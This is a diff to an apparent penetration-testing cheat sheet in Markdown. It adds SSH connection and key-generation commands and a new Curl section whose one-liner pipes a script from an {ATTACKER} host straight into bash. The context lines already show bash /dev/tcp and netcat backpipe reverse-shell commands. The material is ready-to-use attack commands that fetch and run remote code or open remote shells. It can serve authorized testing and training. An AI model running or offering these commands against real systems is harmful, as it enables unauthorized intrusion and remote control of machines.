@@ -42,6 +42,7 @@
 * [Sudo](#Sudo)
 * [Sudoers](#Sudoers)
 * [Netcat](#Netcat)
+* [Curl](#Curl)
 * [Payloads](#Payloads)
 * [Linux Password](#Linux-Password)
 * [Custom Wordlists](#Custom-Wordlists)
@@ -397,12 +398,18 @@ nc {TARGET} pop3
 
 # SSH
 
+### Connection
 ```
 # Password Auth
 ssh {USER}@{IP}
 
 # Key Auth in specific port
 ssh {USER}@{IP} -i {KEY} -p {PORT}
+```
+
+### Key Generation
+```
+ssh-keygen -f {FILE}
 ```
 
 # SCP
@@ -695,6 +702,13 @@ bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
 ```
 mknod /tmp/backpipe p
 /bin/sh 0</tmp/backpipe | nc {IP} {PORT} 1>/tmp/backpipe
+```
+
+# Curl
+
+### Run script content
+```
+curl http://{ATTACKER}/script.sh | bash
 ```
 
 # Payloads
